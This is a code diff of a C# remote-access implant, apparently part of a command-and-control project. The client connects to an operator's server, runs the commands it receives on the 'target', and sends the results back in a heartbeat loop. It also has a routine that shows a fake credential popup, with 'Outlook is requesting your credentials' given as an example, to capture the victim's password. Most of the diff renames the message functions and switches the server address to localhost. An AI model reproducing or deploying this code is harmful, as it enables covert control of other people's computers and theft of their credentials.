@@ -64,11 +64,11 @@ namespace Client
                     //IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
 
                     //string to IP, it wants a System.Net.IPAddress for security/validation reasons
-                    var ip = IPAddress.Parse("192.168.44.147");
+                    var ip = IPAddress.Parse("127.0.0.1");
                     IPAddress ipAddr = ip; //ipHost.AddressList[0]; //just localhost
                     //Console.Write($"[DEBUG] ipHost.AddressList: {ipHost.AddressList}");
 
-                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 100);
+                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 8080);
 
                     // Creation TCP/IP Socket using
                     // Socket Class Constructor
@@ -85,22 +85,17 @@ namespace Client
                         // We print EndPoint information
                         // that we are connected
                         //Console.WriteLine("Socket connected to -> {0} ",
-                                   //sender.RemoteEndPoint.ToString());
+                        //sender.RemoteEndPoint.ToString());
 
                         // Creation of message that
                         // we will send to Server
 
-
-                        //flip me to JSON -- !!
-                        //byte[] messageSent = Encoding.ASCII.GetBytes($"!_client_!\\|/{Properties.ID}\\|/~");
-                        //int byteSent = sender.Send(messageSent);
-
-                        /*
-                        generate hello JSON
+                        //temp getting JSON object & sendingit on over
+                        //byte[] messageSent = Encoding.ASCII.GetBytes(JsonHandler.ToJson());
+                        //int byteSent = MessageHandler.SendMessage(msg: messageSent, conn: sender);
+                        MessageHandler.SendMessage(msg: JsonHandler.ToJson(), conn: sender);
 
 
-
-                        */
 
                         // Data buffer
                         byte[] messageReceived = new byte[1024];
@@ -115,12 +110,16 @@ namespace Client
                         //int byteRecv = sender.Receive(messageReceived);
 
                         //custom receieve function
-                        string stringRecv = Message.RecvMessage(sender);
+                        //string stringRecv = Message.RecvMessage(sender);
+                        string stringRecv = Comms.MessageHandler.RecvMessage(sender);
 
 
                         //string stringRecv = Encoding.ASCII.GetString(messageReceived,0, byteRecv);
 
                         Console.WriteLine($"Message from Server -> {stringRecv}");
+
+
+                     
 
                         // parse message
                         //string[] parsedMessage;
@@ -159,14 +158,14 @@ namespace Client
                                 //string sessionStringRecv = Encoding.ASCII.GetString(newMessageReceived, 0, byteRecv);
                                 
                                 //again custom recieve
-                                string sessionStringRecv = Message.RecvMessage(sender);
+                                string sessionStringRecv = MessageHandler.RecvMessage(sender);
                                 //string[] sessionParsedCommand = Message.CommandParse(sessionStringRecv);
 
                                 //Console.Write($"\nSession Parsed Commands: {sessionParsedCommand[0]}, {sessionParsedCommand[1]}\n");
 
                                 if (sessionStringRecv == "break")
                                 {
-                                    Message.SendMessage("Closing Session", sender);
+                                    MessageHandler.SendMessage("Closing Session", sender);
                                     break;
                                 }
                                 else
@@ -176,7 +175,7 @@ namespace Client
                                     //passes socket into here so it can make socket commands if necessary. Keeps it clean(er) that accessing socket from anywhere
                                     DataFromTarget = DecisionTree(sessionStringRecv, sender);
                                     Console.Write($"Sending message {DataFromTarget} back...\n");
-                                    Message.SendMessage(DataFromTarget, sender);
+                                    MessageHandler.SendMessage(DataFromTarget, sender);
                                     //send back
                                 }
 
@@ -192,7 +191,7 @@ namespace Client
                             DataFromTarget = DecisionTree(stringRecv, sender);
                             Console.Write($"[DEBUG] Message to send back: {DataFromTarget}");
                             //Data is sent to 'send' method (takes the message, and the socket as args)
-                            Message.SendMessage(DataFromTarget, sender);
+                            MessageHandler.SendMessage(DataFromTarget, sender);
                             //mandatory sleep b4 heartbeat & loop restart
                             Thread.Sleep(Properties.msWait);
                         }
@@ -287,7 +286,7 @@ namespace Client
                 {
                     //sending error to freindly client
                     Console.Write($"[Debug] Command Error was: {e.ToString()}\n");
-                    Message.SendMessage("Error with command, make sure it's valid", conn);
+                    MessageHandler.SendMessage("Error with command, make sure it's valid", conn);
                     command = "";
                     commandValue = "";
                 }
@@ -323,7 +322,7 @@ namespace Client
                 {
                     //sending error to freindly client
                     Console.Write($"[Debug] Command Error was: {e.ToString()}\n");
-                    Message.SendMessage("Error with command, make sure it's valid", conn);
+                    MessageHandler.SendMessage("Error with command, make sure it's valid", conn);
                     command = "";
                     commandValue = "";
                 }
@@ -347,13 +346,13 @@ namespace Client
                 string credResults;
 
 
-                Message.SendMessage("Please enter the message that the target will see. Ex: 'Outlook is requesting your credentials:'", conn);
+                MessageHandler.SendMessage("Please enter the message that the target will see. Ex: 'Outlook is requesting your credentials:'", conn);
                 //no need to parse this one as it's getting sent over raw, and only getting one answer
-                targetMessage = Message.RecvMessage(conn);
+                targetMessage = MessageHandler.RecvMessage(conn);
 
-                Message.SendMessage("Please enter the app this request will seemingly come from (used in popup header) Ex: 'Outlook.exe'", conn);
+                MessageHandler.SendMessage("Please enter the app this request will seemingly come from (used in popup header) Ex: 'Outlook.exe'", conn);
                 //same here as above
-                targetApp = Message.RecvMessage(conn);
+                targetApp = MessageHandler.RecvMessage(conn);
 
                 //sending to function
                 credResults = Prompts.requestUserCreds(targetMessage, targetApp);
